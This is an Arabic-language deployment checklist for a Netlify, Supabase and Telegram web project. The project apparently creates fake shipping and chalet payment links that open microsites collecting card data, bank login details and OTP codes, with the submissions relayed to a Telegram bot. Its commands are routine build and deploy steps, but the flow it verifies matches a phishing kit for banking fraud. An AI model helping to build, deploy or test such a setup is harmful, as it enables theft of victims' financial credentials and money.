# ✅ قائمة التحقق قبل النشر - Deployment Checklist

## 🎯 استخدم هذه القائمة قبل نشر المشروع

---

## 1️⃣ تحضير الكود

### الاختبار المحلي
- [ ] المشروع يعمل محلياً بدون أخطاء
  ```bash
  npm run dev
  ```
- [ ] جميع الصفحات تفتح بشكل صحيح
- [ ] لا توجد أخطاء في Console
- [ ] البناء ينجح
  ```bash
  npm run build
  ```

### الكود النظيف
- [ ] لا توجد `console.log` غير ضرورية
- [ ] لا توجد تعليقات TODO مهمة متبقية
- [ ] الكود منظم ومرتب

---

## 2️⃣ Environment Variables

### تأكد من عدم وجود Secrets في الكود
- [ ] لا توجد Supabase keys في الكود
- [ ] لا توجد Telegram tokens في الكود
- [ ] لا توجد API keys مكشوفة

### أنشئ ملف .env
- [ ] نسخ `.env.example` إلى `.env`
  ```bash
  cp .env.example .env
  ```
- [ ] ملء القيم الحقيقية في `.env`

### القيم المطلوبة:
```
✅ VITE_SUPABASE_URL
✅ VITE_SUPABASE_ANON_KEY
✅ VITE_TELEGRAM_BOT_TOKEN
✅ VITE_TELEGRAM_CHAT_ID
```

---

## 3️⃣ Git & GitHub

### .gitignore
- [ ] `.env` موجود في `.gitignore`
- [ ] `node_modules/` موجود في `.gitignore`
- [ ] `dist/` موجود في `.gitignore`

### Commit & Push
- [ ] جميع التغييرات committed
  ```bash
  git add .
  git commit -m "Ready for deployment"
  ```
- [ ] Push إلى GitHub
  ```bash
  git push origin main
  ```

---

## 4️⃣ Netlify Setup

### إنشاء الموقع
- [ ] حساب Netlify جاهز
- [ ] الموقع منشأ (من GitHub أو CLI)
- [ ] Build settings صحيحة:
  - Build command: `npm run build`
  - Publish directory: `dist`

### Environment Variables في Netlify
- [ ] VITE_SUPABASE_URL مضاف
- [ ] VITE_SUPABASE_ANON_KEY مضاف
- [ ] VITE_TELEGRAM_BOT_TOKEN مضاف
- [ ] VITE_TELEGRAM_CHAT_ID مضاف

### Files Configuration
- [ ] `netlify.toml` موجود ✅ (موجود بالفعل)
- [ ] `public/forms.html` موجود ✅ (موجود بالفعل)
- [ ] Redirects معدة ✅ (موجودة بالفعل)

---

## 5️⃣ Forms Setup

### Netlify Forms
- [ ] Form notifications معدة
- [ ] Email notification مضاف
- [ ] اختبار form بعد النشر

---

## 6️⃣ Functions Setup

### Netlify Functions
- [ ] مجلد `/netlify/functions` موجود ✅
- [ ] `microsite-meta.js` موجود ✅
- [ ] Functions تعمل في البيئة المحلية

---

## 7️⃣ Supabase Setup

### Database
- [ ] Supabase project جاهز
- [ ] Tables منشأة:
  - `links`
  - `chalets` (إذا كنت تستخدم الشاليهات)
- [ ] Row Level Security (RLS) معدة

### API Keys
- [ ] Anon key منسوخ
- [ ] Service role key آمن (لا تستخدمه في Frontend)

---

## 8️⃣ Telegram Setup

### Bot Configuration
- [ ] Bot منشأ من BotFather
- [ ] Bot Token منسوخ
- [ ] Chat ID معروف
- [ ] اختبار إرسال رسالة

### Test Message
```bash
# اختبر من Terminal
curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage" \
  -d "chat_id=<CHAT_ID>" \
  -d "text=Test from Netlify"
```

---

## 9️⃣ اختبار بعد النشر

### الصفحات الأساسية
- [ ] الصفحة الرئيسية تفتح
- [ ] صفحة الخدمات تعمل
- [ ] صفحة إنشاء رابط الشحن تعمل
- [ ] صفحة إنشاء رابط الشاليه تعمل

### تدفق الدفع
- [ ] إنشاء رابط ينجح
- [ ] نسخ الرابط يعمل
- [ ] معاينة الرابط تعمل
- [ ] Microsite يفتح
- [ ] صفحة معلومات المستلم تعمل
- [ ] صفحة تفاصيل الدفع تعمل
- [ ] صفحة بيانات البطاقة تعمل
- [ ] صفحة تسجيل دخول البنك تعمل
- [ ] صفحة OTP تعمل
- [ ] صفحة الإيصال تعمل

### Forms & Telegram
- [ ] Forms ترسل بيانات إلى Netlify
- [ ] Telegram يستقبل الرسائل
- [ ] Email notifications تصل

### نوع الرابط
- [ ] رابط بيانات البطاقة يعمل
- [ ] رابط تسجيل الدخول يعمل
- [ ] التوجيه الصحيح حسب النوع

---

## 🔟 الأداء والأمان

### الأداء
- [ ] الموقع يحمّل بسرعة
- [ ] الصور محسّنة
- [ ] لا توجد console errors

### الأمان
- [ ] HTTPS يعمل (Netlify تلقائي)
- [ ] Headers الأمنية معدة (في netlify.toml) ✅
- [ ] لا توجد API keys مكشوفة
- [ ] Forms محمية من Spam

### SEO
- [ ] Meta tags موجودة
- [ ] OG images تعمل
- [ ] Descriptions مناسبة

---

## 1️⃣1️⃣ التوثيق

### للفريق
- [ ] README.md محدث
- [ ] Environment variables موثقة
- [ ] API endpoints موثقة

### للصيانة
- [ ] Netlify site URL محفوظ
- [ ] GitHub repo URL محفوظ
- [ ] Supabase project URL محفوظ
- [ ] Telegram Bot info محفوظ

---

## 1️⃣2️⃣ Backup

### النسخ الاحتياطي
- [ ] Database backup (Supabase تلقائي)
- [ ] Code على GitHub ✅
- [ ] Environment variables محفوظة بشكل آمن
- [ ] التوثيق محفوظ

---

## 🎯 الأوامر السريعة

### للنشر السريع:
```bash
# 1. Build
npm run build

# 2. Deploy
netlify deploy --prod

# أو من GitHub (أوتوماتيكي)
git push origin main
```

### لإضافة Environment Variable:
```bash
netlify env:set KEY "value"
```

### لرؤية الموقع:
```bash
netlify open:site
```

### للوحة التحكم:
```bash
netlify open:admin
```

---

## ✅ النتيجة النهائية

عند إكمال جميع النقاط أعلاه:
- ✅ الموقع حي وآمن
- ✅ جميع الميزات تعمل
- ✅ Forms ترسل البيانات
- ✅ Telegram يستقبل الإشعارات
- ✅ Auto-deployment معد
- ✅ جاهز للإنتاج!

---

## 📞 إذا واجهت مشكلة

1. راجع هذه القائمة مرة أخرى
2. تحقق من Netlify Deploy Logs
3. افحص Browser Console
4. راجع `NETLIFY_DEPLOY_GUIDE.md`

---

## 🎉 مبروك!

إذا أكملت جميع النقاط، موقعك جاهز للعالم! 🌍
